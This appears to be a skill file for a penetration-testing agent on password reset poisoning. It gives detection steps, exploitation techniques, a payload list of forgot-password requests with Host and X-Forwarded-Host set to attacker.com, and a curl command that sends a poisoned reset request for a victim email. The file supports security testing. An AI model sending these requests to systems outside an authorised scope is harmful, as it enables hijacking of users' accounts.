---
name: password-reset-poisoning
description: Password reset poisoning and reset-flow flaws — Host header injection into reset links, mass token assignment, token enumeration, response token leak, and reset-link reuse. Use when the app emails password-reset links built from the request Host or X-Forwarded-Host.
category: authn-authz
---

# Password Reset Poisoning

## Detection
- Request to `/forgot-password` → email generated. Does the link use `Host`, `X-Forwarded-Host`, `X-Forwarded-Proto`, or `Forwarded`?
- Is the reset token: in the URL, in response, predictable (timestamp-based/UUID v1/sequential), reusable, or multi-use?

## Exploitation
1. **Host header poisoning**: `POST /forgot-password` with `Host: attacker.com` → victim clicks reset link at attacker.com carrying the token.
2. **Mass assignment on reset**: `{"email":"victim@x","email_confirmation":"victim@x"}` — set a different `email` in the reset request.
3. **Token in response**: reset request echoes the token/URL.
4. **Token predictability**: sequential, short (4-digit), or derived from email/userid.
5. **Reuse**: token not invalidated after password change; reusable across accounts (`?token=` swapped).
6. **User enumeration via reset**: response timing/status differs for existing vs non-existing emails (only report as a low if it enables further attacks).

## Payloads
```
POST /forgot-password  Host: attacker.com
POST /forgot-password  X-Forwarded-Host: attacker.com
POST /forgot-password  X-Forwarded-Proto: http
POST /forgot-password  {"email":"victim@x.com","email_confirm":"victim@x.com"}
POST /forgot-password  {"user":"victim","reset_url":"http://attacker.com"}
```

## Tool Commands (Windows)
```powershell
# poison the reset link host
curl.exe -s -X POST "$U/forgot-password" -H 'Host: attacker.com' -H 'Content-Type: application/json' -d '{"email":"victim@x.com"}' -i
# check token length/entropy
curl.exe -s -L "$U/reset?token=TOKEN" -i | Select-Object -First 20
```

## Verification & Evidence
- Proof = reset email/link embeds attacker-controlled host (capture email via a mailbox in scope or show the constructed link in response/HTML).
- If you cannot read the email, show the poisoned URL construction and note as partial.